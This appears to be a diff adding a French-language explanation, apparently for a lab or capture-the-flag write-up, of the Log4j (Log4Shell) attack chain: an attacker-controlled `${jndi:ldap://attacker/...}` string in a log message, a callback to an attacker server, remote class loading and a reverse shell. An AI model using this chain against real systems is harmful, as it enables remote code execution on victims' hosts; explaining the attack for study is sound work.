@@ -89,3 +89,14 @@
 
 ### 3. Idea
 1. Log4j Exploitation.
+2. Point d'entrée : l'application vulnérable (par exemple, un serveur Java qui enregistre des données contrôlées par l'attaquant) contient une recherche Log4j de type `JNDI:ldap://attacker/...` dans un message de journal ou toute chaîne formatée par Log4j.
+
+3. Déclencheur (Trigger): lorsque Log4j traite la chaîne(string), il effectue une recherche JNDI grâce à l'expression `${jndi:...}.`
+
+4. Rappel réseau : la **JVM** effectue une requête réseau `(LDAP/RMI/HTTP)` auprès du service contrôlé par l'attaquant indiqué dans l'URL JNDI.
+
+5. Livraison de payload: le service contrôlé par l'attaquant répond avec une référence qui force la JVM à récupérer et exécuter une classe Java distante (ou à désérialiser/exécuter la charge utile), ce qui entraîne l'exécution de code à distance sur l'hôte victime.
+
+6. Action post-exploitation: le code distant exécute ce que vous avez intégré, une commande shell qui lance un shell inversé sur notre machine.
+
+7. L'attaque se situe donc au niveau de la chaîne de journalisation/format → recherche JNDI → chargement de classe à distance → point d'exécution du code dans la chaîne d'exploitation.
